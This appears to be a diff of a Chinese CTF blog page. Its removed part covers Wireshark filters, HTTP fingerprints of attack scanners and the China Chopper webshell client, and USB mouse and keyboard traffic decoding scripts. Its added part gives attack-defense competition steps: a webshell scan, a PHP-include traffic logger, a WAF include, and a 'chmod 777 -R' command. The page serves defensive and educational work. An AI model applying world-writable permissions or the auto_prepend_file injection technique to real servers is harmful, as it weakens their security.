-<li><p><code>http.request.method==&quot;POST&quot;</code> 过滤全部POST数据包</p>
-</li>
-<li><p><code>http.request.uri==&quot;/img/logo-edu.gif&quot;</code></p>
-</li>
-<li><p><code>http contains&quot;GET&quot;</code> 模糊匹配 http头中有这个关键字</p>
-</li>
-<li><p><code>http contains&quot;HTTP/1.&quot;</code> 版本号</p>
-</li>
-<li><p><code>http.request.method==&quot;GET&quot;&amp;&amp; http contains&quot;User-Agent:&quot;</code></p>
-</li>
-</ul>
-<h3 id="常见指纹特征"><a href="#常见指纹特征" class="headerlink" title="常见指纹特征"></a>常见指纹特征</h3><ul>
-<li><p><strong>Awvs</strong>:</p>
-<ul>
-<li>acunetix_wvs_security_test acunetix</li>
-<li>acunetix_wvs acunetix_test</li>
-<li>Acunetix-Aspect-Password:Cookie:</li>
-<li>acunetix_wvs_security_test X-Forwarded-Host:</li>
-<li>acunetix_wvs_security_test X-Forwarder-For:</li>
-<li>acunetix_wvs-security_test Host:</li>
-<li>acunetix_wvs_security_test</li>
-</ul>
-</li>
-<li><p><strong>Netsparker</strong>:</p>
-<ul>
-<li>X-Scanner:NetsparkerLocation:</li>
-<li>NetsparkerAccept:netsparker&#x2F;chechCookie:</li>
-<li>netsparkerCookie:NETSPARKER</li>
-</ul>
-</li>
-<li><p><strong>Appscan</strong>:</p>
-<ul>
-<li>Headers Content-Type:Appscan</li>
-<li>Content-Type:AppScanHeader</li>
-<li>Accept:Appscan User-Agent:Appscan</li>
-</ul>
-</li>
-<li><p><strong>Nessus</strong>:</p>
-<ul>
-<li>x_forwarded_for:nessus</li>
-<li>referer:nessus</li>
-<li>host:nessus</li>
-</ul>
-</li>
-<li><p><strong>sqlmap</strong>:</p>
-<ul>
-<li>User-Agent:sqlmap1.2.8#stable</li>
-</ul>
-</li>
-<li><p><strong>中国菜刀</strong></p>
-<ul>
-<li>x-www-form-urlencoded</li>
-</ul>
-</li>
-</ul>
-<h2 id="USB-流量分析"><a href="#USB-流量分析" class="headerlink" title="USB 流量分析"></a>USB 流量分析</h2><p>usb流量目前遇到的是<code>鼠标流量</code>，<code>键盘流量</code>，<code>数位板流量</code>,后面遇到新的再补充</p>
-<p>usb设备的流量包比较朴素，用wireshark打开后可以直观感受到，所以很好辨认。</p>
-<h3 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h3><p>鼠标流量的一般思路为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source FILE_PATH</span><br></pre></td></tr></table></figure>
+
+<h3 id="D盾扫目录"><a href="#D盾扫目录" class="headerlink" title="D盾扫目录"></a>D盾扫目录</h3><p>将打包好的文件拖出来，放到D盾里面去扫，拖出来的过程有点慢，这时候可以上<strong>weblogger</strong>了</p>
+<h3 id="上weblogger"><a href="#上weblogger" class="headerlink" title="上weblogger"></a>上weblogger</h3><p>weblogger是进行流量监控，</p>
 <ol>
-<li>提取鼠标的按键信息和移动信息</li>
-<li>将这些信息转换坐标信息</li>
-<li>将坐标信息变为图片</li>
+<li><p>将weblogger拖到html目录下</p>
+</li>
+<li><p>给weblogger 777的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 -R weblogger</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在浏览器打开weblogger下的install.php文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+/weblogger/install.php</span><br></pre></td></tr></table></figure>
+
+<p>输入一系列东西之后如果成功会出现如下界面</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/weblogger.jpg" alt="weblogger"></p>
+<p><strong>记住这两行的内容</strong></p>
+<p>第一行是需要包含到文件中的路径</p>
+<p>第二行是welogger的登录地址</p>
+</li>
+<li><p>添加文件包含到index.php文件里面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;xxx&#x27;</span> ; </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;xxx&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#xxx为绝对路径或者相对路径</span></span><br><span class="line">    </span><br><span class="line">改 .user.ini配置文件 auto_prepend_file=; </span><br><span class="line">包含在文件头auto_append_file=; 包含在文件尾</span><br></pre></td></tr></table></figure>
+
+<p>这里不一定只包含到index.php中，具体情况具体分析</p>
+</li>
+<li><p>登录weblogger查看流量</p>
+<p>靶机地址后面拼接第二行的内容</p>
+<p><img src="https://gaoxudong.top/wp-content/uploads/2023/04/weblogger-1.jpg" alt="weblogger-1"></p>
+<p>登录刚才输入的账号密码，然后就可以查看流量监控</p>
+</li>
 </ol>
-<p>在提取信息之前先来认识一下提取的那些信息</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230420224512.jpg" alt="QQ截图20230420224512"></p>
-<p>流量最开始的这几行是鼠标与主机链接通信产生的，虽然可以通过这里判断是键盘流量还是鼠标流量，但是没有必要</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230420224756.jpg" alt="QQ截图20230420224756"></p>
-<p>我们需要的流量是目标地址为host的流量</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230421160522.jpg" alt="QQ截图20230421160522"></p>
-<p>其他的不管只看HID Data</p>
-<p><strong>HID Data一般情况下有六个字节</strong>(这种得看鼠标的情况，我自己抓出来是7字节的，6字节出题比较常见，我们以六字节来举例)</p>
-<p>这六个字节去掉第一个字节和最后两个字节，剩下的三个字节从左到右分别代表<code>按键信息</code>,<code>鼠标X轴移动信息</code>,<code>鼠标y轴移动信息</code></p>
-<p>对于<code>按键信息</code></p>
-<ul>
-<li>00表示没有任何键按下</li>
-<li>01表示左键按下</li>
-<li>02表示右键按下</li>
-<li>04表示中键按下</li>
-</ul>
-<p>对于<code>鼠标X轴移动信息</code></p>
-<ul>
-<li><p>这是一个八位有符号的整数</p>
-</li>
-<li><p>最高位是符号位，为1时表示向左移动，为0表示向右移动</p>
-</li>
-<li><p>后面7位时移动的像素位数</p>
-<p>举个例子，<code>A9 -&gt;&gt; (10101001) -&gt;&gt; (-51) </code>,表示向左移动51像素</p>
-<p>当hex数值大于80时表示向左移动，小于表示向右移动</p>
-</li>
-</ul>
-<p>对于<code>鼠标Y轴移动信息</code>，同上</p>
-<p>知道这些之后，就需要把这些数据提取出来，这时候就借助到Tshark工具(在windows环境下，需要将tshark的路径加到环境变量里面才能执行tshark.exe)</p>
-<p>tshark的基础命令如下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入文件:</span><br><span class="line">　　-r: -r &lt;infile&gt; 设置读取本地文件</span><br><span class="line">处理选项:</span><br><span class="line">　　-R: -R &lt;<span class="built_in">read</span> filter&gt;,包的读取过滤器，可以在wireshark的filter语法上查看；在wireshark的视图-&gt;过滤器视图，在这一栏点击表达式，就会列出来对所有协议的支持</span><br><span class="line">　　-Y: -Y &lt;display filter&gt;,使用读取过滤器的语法，在单次分析中可以代替-R选项</span><br><span class="line">输出选项:</span><br><span class="line">　　-T: -T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text</span><br><span class="line">　　-e: 如果-T fields选项指定，-e用来指定输出哪些字段(这个可以在wireshark中左键选中想要导出的信息，然后往出拖一下，就可以看到要提取的信息了)</span><br></pre></td></tr></table></figure>
+<p><strong>如果weblogger忘了给权限，就换一个浏览器从第二步重新开始</strong></p>
+<p>换一个浏览器</p>
+<p>换一个浏览器</p>
+<p>换一个浏览器</p>
+<h3 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h3><p>waf有被check的风险，所以我个人的想法就是不上waf。</p>
+<p>上waf方法比较简单，与weblogger是相同的</p>
+<p>传waf到一个路径，然后包含到index或者其他路径里面就行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r file -T fields -e usbhid.data &gt; hiddata.txt</span><br></pre></td></tr></table></figure>
-
-<p>这条指令会把数据提取到hiddata.txt文件中，接下来就要对txt文件进行处理</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)<span class="comment">#这两处文件可能需要修改，如过脚本执行有问题，需要把txt文件编码改成utf-8</span></span><br><span class="line">result=<span class="built_in">open</span>(<span class="string">&#x27;xy.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys: </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) != <span class="number">13</span> :<span class="comment">#忽略空行,长度看情况定</span></span><br><span class="line">         <span class="keyword">continue</span> </span><br><span class="line">    x = <span class="built_in">int</span>(line[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">    y = <span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt;<span class="number">120</span> :<span class="comment">#这个参数控制单个字符的高度，如果高度过大导致字符过瘦，请调大</span></span><br><span class="line">        y -=<span class="number">264</span><span class="comment">#这个参数控制字符串的倾斜程度，如果向下倾斜就调高，如果向上倾斜就调低</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)  <span class="comment"># 1代表左键按下 , 2代表右键按下 , 0代表无事</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">1</span> :<span class="comment">#btn_flag的值可能也需要更改</span></span><br><span class="line">        result.write(<span class="built_in">str</span>(posx)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(-posy)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure>
-
-<p>这时我们就得到了处理好的坐标</p>
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230421181504.jpg" alt="QQ截图20230421181504"></p>
-<p>这时就画出图像了，画图可以使用python脚本，需要安装numpy库和matplotlib库</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x, y = np.loadtxt(<span class="string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="string">&#x27; &#x27;</span>, unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>如果没有也可以使用kali中的<code>gnuplot</code>工具(这个也需要提前安装)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunplot</span><br><span class="line">&gt;plot <span class="string">&quot;filename&quot;</span> <span class="comment">#记得加引号</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230421182019.jpg" alt="QQ截图20230421182019"></p>
-<p>具体效果一言难尽，能凑合看就行</p>
-<h3 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h3><p>键盘流量原理和鼠标流量差不太多，不过是六个字节变成8个字节了</p>
-<p>这8个字节所用到的信息存贮在第一个字节和第三个字节中，</p>
-<ul>
-<li><p>第一个中存贮的几个特殊按键的信息(转换成二进制，看二进制数的1的位置)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BYTE1 --</span><br><span class="line">       |--bit0:   Left Control是否按下，按下为1 </span><br><span class="line">       |--bit1:   Left Shift  是否按下，按下为1 </span><br><span class="line">       |--bit2:   Left Alt    是否按下，按下为1 </span><br><span class="line">       |--bit3:   Left GUI    是否按下，按下为1 </span><br><span class="line">       |--bit4:   Right Control是否按下，按下为1  </span><br><span class="line">       |--bit5:   Right Shift 是否按下，按下为1 </span><br><span class="line">       |--bit6:   Right Alt   是否按下，按下为1 </span><br><span class="line">       |--bit7:   Right GUI   是否按下，按下为1 </span><br></pre></td></tr></table></figure>
-</li>
-<li><p>第三个字节中存贮的是按键的信息，具体的对应表如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果按下shift的会字母变为大写</p>
-<p>举个例子</p>
-<p><code>10 00 19 00 00 00 00 00</code></p>
-<p><code>10</code>转换成二进制是<code>0001 0000</code>第五位为1代表右shift按下，<code>19</code>对应的是<code>v</code>所以结果是大写的V</p>
-<p>原理知道了，直接上脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">              <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;r&quot;</span>,</span><br><span class="line">              <span class="string">&quot;16&quot;</span>: <span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">              <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;24&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;25&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;26&quot;</span>: <span class="string">&quot;9&quot;</span>, <span class="string">&quot;27&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">              <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;-&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;[&quot;</span>,</span><br><span class="line">              <span class="string">&quot;30&quot;</span>: <span class="string">&quot;]&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;&lt;GA&gt;&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">              <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">              <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>: <span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>: <span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>: <span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>: <span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>: <span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>: <span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>: <span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">             <span class="string">&quot;0d&quot;</span>: <span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>: <span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>: <span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>: <span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>: <span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>: <span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>: <span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>: <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">             <span class="string">&quot;16&quot;</span>: <span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>: <span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>: <span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>: <span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>: <span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>: <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1e&quot;</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">             <span class="string">&quot;1f&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>: <span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>: <span class="string">&quot;$&quot;</span>, <span 